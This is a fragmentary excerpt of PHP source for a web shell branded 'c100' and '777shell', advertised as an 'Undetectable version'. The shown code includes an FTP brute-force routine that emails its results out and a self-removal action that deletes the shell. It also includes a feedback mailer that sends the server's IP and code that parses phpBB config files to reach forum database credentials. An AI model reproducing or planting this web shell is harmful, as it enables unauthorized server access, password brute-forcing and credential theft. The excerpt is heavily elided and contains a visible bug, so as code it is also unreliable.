  ...
  if (!empty($submit))
  {
   ...
   else
   {
    if ($fqb_logging)
    {
     ...
     $fqb_log = "FTP Quick Brute (called c100 v. ".$shver.") started at ".date("d.m.Y H:i:s")."\r\n\r\n";
    ...
    if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
    if ($fqb_logemail) {@mail($fqb_logemail,"777shell v. ".$shver." report",$fqb_log);}
    fclose($fqb_logfp);
   }
  }
  else
...
if ($act == "selfremove")
{
 ...
 {
  if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using 777shell v.".$shver."!"; N3tshexit(); }
...
if ($act == "feedback")
{
 ...
 if (!empty($submit))
 {
  ...
  $body = "c100 v.".$shver." feedback #".$ticket."\nName: ".htmlspecialchars($fdbk_name)."\nE-mail: ".htmlspecialchars($fdbk_email)."\nMessage:\n".htmlspecialchars($fdbk_body)."\n\nIP: ".$REMOTE_ADDR;
  if (!empty($fdbk_ref))
  {
   $tmp = @ob_get_contents();
   ob_clean();
  ...
  mail($suppmail,"c100 v.".$shver." feedback #".$ticket,$body,"FROM: ".$suppmail);
  ...
  elseif ($ft == "code")
  {
   if (ereg("php"."BB 2.(.*) auto-generated config file",$r))
   {
    ...
    if (count($arr == 18))
    {
     ...
     else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by c100. Please, report us for fix.";}
...
if ($act == "about") {echo "<center>Undetectable version by <br> Don </center>";}
?>
